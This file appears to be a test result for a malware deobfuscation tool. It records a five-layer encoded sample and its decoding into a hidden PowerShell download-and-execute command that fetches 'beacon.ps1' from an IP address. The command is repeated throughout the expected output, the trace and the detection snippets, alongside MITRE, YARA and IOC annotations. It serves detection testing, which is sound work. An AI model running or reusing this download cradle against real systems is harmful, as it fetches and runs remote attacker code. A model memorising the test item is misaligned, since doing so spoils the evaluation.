@@ -1,0 +1,638 @@
+{
+  "sample_id": "R2_S01_cobalt_5layer",
+  "wrap": "URL(b64(hex(rev(b64(P)))))",
+  "input": "M2QzZDUxNGI2OTQ1N2E2Mzc3MzU2OTYyNzY0ZTU3NTk2YzRhMzI0Yzc4Njc1NDRkNzU0MTU0NGQ3NTY3NDQ0ZTc4MzQ1MzRlMzAzODc5NGMzNjQxNDg2NDMwNjg2ZDQ5NmY2MzZkNjI3MDRhNDg2NDU0NTI1NzU5NzY3ODZkNjIzMzM5NDc1Mjc1NmI0MzY0NzU1NjU3NjE3MzRlNmI1OTZjNjQ2YzRjMzA1NjZkNTQ2NzUxMzM1OTZjNzA2ZDU5NTAzMTc5NjQ2YzM1NDU0YjY3Njc1NjUyNGE0Mjc5NTk3NDQxNjk2MjZjNTI0NzVhNzA2ODQ3NDkzMzMxNDM0OTc3Mzk2ZDYyNzQ0MTQzNjI3MzU2NDc2MTdhNGE1ODVhMzMzOTQ3NjM%3D",
+  "input_sha1": "f0ce2a010480e6f06046a322ae4155b3814426ff",
+  "expected_plaintext": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+  "expected_token": "powershell",
+  "http_ms": 18441,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "url-decode",
+        "args": {},
+        "reason": "URL percent-encoded characters"
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload"
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse"
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      }
+    ],
+    "output": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart \u00b7 conf 100/100\n  Chain:       url-decode \u2192 base64-decode \u2192 hex-decode \u2192 reverse \u2192 base64-decode\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n    T1059.001    \u00b7 Execution\n    T1027        \u00b7 Defense Evasion\n    T1566.001    \u00b7 Initial Access\n\n  LOLBIN       powershell.exe\n\n  IOCs\n    URL       http://45.148.10.181/beacon.ps1\n    IP        45.148.10.181\n    IP        181.01.841.54\n\n  Behavior\n    1. Executes PowerShell (T1059.001)\n    2. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [],
+    "detected_type": null,
+    "engine": "smart",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "url-decode",
+        "args": {},
+        "reason": "URL percent-encoded characters",
+        "output_preview": "M2QzZDUxNGI2OTQ1N2E2Mzc3MzU2OTYyNzY0ZTU3NTk2YzRhMzI0Yzc4Njc1NDRkNzU0MTU0NGQ3NTY3NDQ0ZTc4MzQ1MzRlMzAzODc5NGMzNjQxNDg2NDMwNjg2ZDQ5NmY2MzZkNjI3MDRhNDg2NDU0NTI1NzU5NzY3ODZkNjIzMzM5NDc1Mjc1NmI0MzY0NzU1NjU3NjE3MzRlNmI1OTZjNjQ2YzRjMzA1NjZkNTQ2NzUxMzM1OTZjNzA2ZDU5NTAzMTc5NjQ2YzM1NDU0YjY3Njc1NjUyNGE0Mjc5NTk3NDQxNjk2MjZjNTI0NzVhNzA2ODQ3NDkzMzMxNDM0OTc3Mzk2ZDYyNzQ0MTQzNjI3MzU2NDc2MTdhNGE1ODVhMzMzOTQ3NjM=",
+        "output_length": 396,
+        "evidence": {
+          "encoding": "URL percent-encoding",
+          "op": "url-decode",
+          "length": 396,
+          "ascii": true,
+          "entropy": 4.515,
+          "hex_preview": "4d 32 51 7a 5a 44 55 78 4e 47 49 32 4f 54 51 31 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "3d3d514b69457a6377356962764e57596c4a324c7867544d7541544d7567444e7834534e3038794c3641486430686d496f636d62704a48645452575976786d6233394752756b436475565761734e6b596c646c4c30566d54675133596c706d59503179646c35454b676756524a427959744169626c52475a706847493331434977396d6274414362735647617a4a585a33394763",
+        "output_length": 296,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 296,
+          "ascii": true,
+          "entropy": 3.492,
+          "hex_preview": "33 64 33 64 35 31 34 62 36 39 34 35 37 61 36 33 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload",
+        "output_preview": "==QKiEzcw5ibvNWYlJ2LxgTMuATMugDNx4SN08yL6AHd0hmIocmbpJHdTRWYvxmb39GRukCduVWasNkYldlL0VmTgQ3YlpmYP1ydl5EKggVRJByYtAiblRGZphGI31CIw9mbtACbsVGazJXZ39Gc",
+        "output_length": 148,
+        "evidence": {
+          "encoding": "Hexadecimal ASCII",
+          "op": "hex-decode",
+          "length": 148,
+          "ascii": true,
+          "entropy": 5.539,
+          "hex_preview": "3d 3d 51 4b 69 45 7a 63 77 35 69 62 76 4e 57 59 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse",
+        "output_preview": "cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly80NS4xNDguMTAuMTgxL2JlYWNvbi5wczEiKQ==",
+        "output_length": 148,
+        "evidence": {
+          "encoding": "String reversal",
+          "op": "reverse",
+          "length": 148,
+          "ascii": true,
+          "entropy": 5.539,
+          "hex_preview": "63 47 39 33 5a 58 4a 7a 61 47 56 73 62 43 41 74 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+        "output_length": 109,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 109,
+          "ascii": true,
+          "entropy": 4.966,
+          "hex_preview": "70 6f 77 65 72 73 68 65 6c 6c 20 2d 6e 6f 70 20 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "url-decode",
+      "base64-decode",
+      "hex-decode",
+      "reverse",
+      "base64-decode"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 40,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 398,
+        "length_bucket": "m",
+        "entropy": 4.515,
+        "b64_density": 0.997,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": false,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": {
+      "mode": "balanced",
+      "input_profile": {
+        "kind": "mixed",
+        "entropy": 4.515,
+        "length": 398,
+        "letter_ratio": 0.824,
+        "digit_ratio": 0.173,
+        "punct_ratio": 0.003,
+        "space_ratio": 0.0,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.68,
+        "priors": [],
+        "reasons": [
+          "mixed-shape"
+        ]
+      },
+      "output_profile": {
+        "kind": "script_wrapper",
+        "entropy": 4.966,
+        "length": 109,
+        "letter_ratio": 0.651,
+        "digit_ratio": 0.101,
+        "punct_ratio": 0.183,
+        "space_ratio": 0.064,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.141,
+        "priors": [
+          "extract-payload",
+          "powershell-encoded",
+          "powershell-deobfuscate"
+        ],
+        "reasons": [
+          "script-marker"
+        ]
+      },
+      "input_linguistic_score": 0.0498,
+      "output_linguistic_score": 0.986,
+      "linguistic_delta": 0.9362,
+      "confidence": {
+        "confidence": 0.8181,
+        "band": "high",
+        "structural": 0.7,
+        "readability": 0.9937,
+        "entropy_sanity": 0.8,
+        "context": 0.75,
+        "weights": {
+          "structural": 0.3,
+          "readability": 0.3,
+          "entropy_sanity": 0.2,
+          "context": 0.2
+        },
+        "reasons": [
+          "structural: inferred-valid (printable=1.00)",
+          "readability: printable=1.00, linguistic=0.99",
+          "entropy: mixed-content-entropy=4.97",
+          "context: output-has-actionable-tokens"
+        ],
+        "dimensions": {
+          "structural": {
+            "score": 0.7,
+            "reason": "inferred-valid (printable=1.00)"
+          },
+          "readability": {
+            "score": 0.9937,
+            "reason": "printable=1.00, linguistic=0.99"
+          },
+          "entropy_sanity": {
+            "score": 0.8,
+            "reason": "mixed-content-entropy=4.97"
+          },
+          "context": {
+            "score": 0.75,
+            "reason": "output-has-actionable-tokens"
+          }
+        }
+      },
+      "explanation": "Chain [url-decode \u2192 base64-decode \u2192 hex-decode \u2192 reverse \u2192 base64-decode] substantially improved readability (\u0394=+0.936 linguistic score). Selected by evidence-based scoring: structural validity, printable ratio, English density, and analyst-keyword hits.",
+      "narrative": null,
+      "trace": null
+    },
+    "layer_trace": [
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 5,
+        "score": 1.2591,
+        "verdict": "decoded"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 3,
+        "score": 0.6,
+        "verdict": "decoded"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 5,
+        "op": "base64-decode",
+        "iocs": {
+          "urls": [
+            "http://45.148.10.181/beacon.ps1"
+          ],
+          "ips": [
+            "45.148.10.181"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "powershell.exe",
+            "purposes": [
+              "Execute",
+              "Download"
+            ],
+            "mitre": [
+              "T1059.001",
+              "T1197"
+            ],
+            "description": "PowerShell with encoded/hidden/download-and-execute or discovery pattern (incl. BITS-transfer stealthy download)",
+            "snippet": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/powershell/",
+            "source": "curated"
+          }
+        ]
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 70,
+      "reason": "URL surfaced in decoded output: http://45.148.10.181/beacon.ps1.",
+      "indicators": [
+        {
+          "label": "Low entropy (4.97) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL percent-encoding layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Hexadecimal ASCII layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "String reversal layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://45.148.10.181/beacon.ps1",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 70
+    },
+    "iocs": {
+      "urls": [
+        "http://45.148.10.181/beacon.ps1"
+      ],
+      "ips": [
+        "45.148.10.181",
+        "181.01.841.54"
+      ],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      },
+      {
+        "id": "T1059.001",
+        "technique": "PowerShell (hidden)",
+        "tactic": "Execution"
+      },
+      {
+        "id": "T1027",
+        "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+        "tactic": "Defense Evasion"
+      },
+      {
+        "id": "T1566.001",
+        "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)",
+        "tactic": "Initial Access"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "powershell.exe",
+        "purposes": [
+          "Execute",
+          "Download"
+        ],
+        "mitre": [
+          "T1059.001",
+          "T1197"
+        ],
+        "description": "PowerShell with encoded/hidden/download-and-execute or discovery pattern (incl. BITS-transfer stealthy download)",
+        "snippet": "1ODVhMzMzOTQ3NjM%3D powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\") M2QzZDUxNGI2OTQ1N2E2Mzc3MzU2OTYyNzY0ZTU3N",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/powershell/",
+        "source": "curated"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "M2QzZDUxNGI2OTQ1N2E2Mzc3MzU2OTYyNzY0ZTU3NTk2YzRhMzI0Yzc4Njc1NDRkNzU0MTU0NGQ3NTY3NDQ0ZTc4MzQ1MzRlMzAzODc5NGMzNjQxNDg2NDMwNjg2ZDQ5NmY2MzZkNjI3MDRhNDg2NDU0NTI1NzU5NzY3ODZkNjIzMzM5NDc1Mjc1NmI0MzY0NzU1NjU3NjE3MzRlNmI1OTZjNjQ2YzRjMzA1NjZkNTQ2NzUxMzM1OTZjNzA2ZDU5NTAzMTc5NjQ2YzM1NDU0YjY3Njc1NjUyNGE0Mjc5NTk3NDQxNjk2MjZjNTI0NzVhNzA2ODQ3NDkzMzMxNDM0OTc3Mzk2ZDYyNzQ0MTQzNjI3MzU2NDc2MTdhNGE1ODVhMzMzOTQ3NjM%3D",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "M2QzZDUxNGI2OTQ1N2E2Mzc3MzU2OTYyNzY0ZTU3NTk2YzRhMzI0Yzc4Njc1NDRkNzU0MTU0NGQ3NTY3NDQ0ZTc4MzQ1MzRlMzAzODc5NGMzNjQxNDg2NDMw",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 4,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 5,
+        "label": "L5 \u00b7 BASE64-DECODE",
+        "op": "base64-decode",
+        "preview": "http://45.148.10.181/beacon.ps1 45.148.10.181",
+        "iocs": {
+          "urls": [
+            "http://45.148.10.181/beacon.ps1"
+          ],
+          "ips": [
+            "45.148.10.181"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "powershell.exe",
+            "purposes": [
+              "Execute",
+              "Download"
+            ],
+            "mitre": [
+              "T1059.001",
+              "T1197"
+            ],
+            "description": "PowerShell with encoded/hidden/download-and-execute or discovery pattern (incl. BITS-transfer stealthy download)",
+            "snippet": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/powershell/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1566.001",
+            "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)",
+            "tactic": "Initial Access"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "beacon",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": "cobaltstrike",
+        "severity": {
+          "score": 21,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+        "iocs": {
+          "urls": [
+            "http://45.148.10.181/beacon.ps1"
+          ],
+          "ips": [
+            "45.148.10.181"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "powershell.exe",
+            "purposes": [
+              "Execute",
+              "Download"
+            ],
+            "mitre": [
+              "T1059.001",
+              "T1197"
+            ],
+            "description": "PowerShell with encoded/hidden/download-and-execute or discovery pattern (incl. BITS-transfer stealthy download)",
+            "snippet": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/powershell/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          },
+          {
+            "id": "T1059.001",
+            "technique": "PowerShell (hidden)",
+            "tactic": "Execution"
+          },
+          {
+            "id": "T1566.001",
+            "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)",
+            "tactic": "Initial Access"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_HiddenWindow",
+            "severity": "medium",
+            "match": "-w hidden",
+            "description": "PowerShell hidden window flag"
+          },
+          {
+            "rule": "PS_DownloadString",
+            "severity": "high",
+            "match": "Net.WebClient",
+            "description": "Remote script/binary download"
+          },
+          {
+            "rule": "IEX_Invocation",
+            "severity": "high",
+            "match": "IEX",
+            "description": "In-memory execution via IEX"
+          },
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "powershell",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": "cobaltstrike",
+        "severity": {
+          "score": 42,
+          "band": "medium"
+        }
+      }
+    ],
+    "output_raw": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart \u00b7 conf 100/100\n  Chain:       url-decode \u2192 base64-decode \u2192 hex-decode \u2192 reverse \u2192 base64-decode\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n    T1059.001    \u00b7 Execution\n    T1027        \u00b7 Defense Evasion\n    T1566.001    \u00b7 Initial Access\n\n  LOLBIN       powershell.exe\n\n  IOCs\n    URL       http://45.148.10.181/beacon.ps1\n    IP        45.148.10.181\n    IP        181.01.841.54\n\n  Behavior\n    1. Executes PowerShell (T1059.001)\n    2. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
